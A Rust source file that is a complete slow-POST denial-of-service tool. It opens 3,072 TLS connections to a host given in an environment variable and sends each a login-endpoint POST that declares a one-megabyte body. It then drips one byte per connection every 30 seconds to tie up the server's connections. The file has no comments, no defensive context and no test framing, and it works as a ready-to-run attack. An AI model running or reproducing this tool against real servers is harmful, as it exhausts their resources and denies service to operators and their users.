extern crate native_tls;
use native_tls::TlsConnector;
use std::env;
use std::io::Write;
use std::net::TcpStream;
use std::thread;
use std::time::Duration;

fn main() {
    let host = env::var("HOST").unwrap();
    let port = "443";
    let threads_count = 3;
    let connections_count = 1024;

    //let connections_producer = thread::spawn(move || {

    //});

    let mut threads = Vec::with_capacity(threads_count);
    let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\nemail=", host);
    for thread_number in 0..threads_count {
        let host = host.to_owned();
        let connections_count = connections_count.to_owned();
        let start = start.to_owned();
        let thread = thread::spawn( move || {
            let mut streams = Vec::with_capacity(connections_count);
            let mut progresses = Vec::with_capacity(connections_count);
            for connection_number in 0..connections_count {
                let connector = TlsConnector::builder().unwrap().build().unwrap();
                let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
                let mut stream = connector.connect(&host, stream).unwrap();
                let mut progress = String::new();
                progress.push_str(&start);
                let _  = stream.write(start.as_bytes());
                streams.push(stream);
                progresses.push(progress);
                println!("[Thread: {}][Thread Connection: {}][Written: {}]", thread_number, connection_number, progresses[connection_number]);
            }

            loop {
                thread::sleep(Duration::from_secs(30));
                let symbol = "a";
                for connection_number in 0..connections_count {
                    let _ = streams[connection_number].write(symbol.as_bytes());
                    let _ = streams[connection_number].flush();
                    progresses[connection_number].push_str(&symbol);
                    println!("[Thread: {}][Thread Connection: {}][Written: {}]", thread_number, connection_number, progresses[connection_number]);
                }
            }
        });
        threads.push(thread);
    }
    for thread in threads {
        let _ = thread.join();
    }
}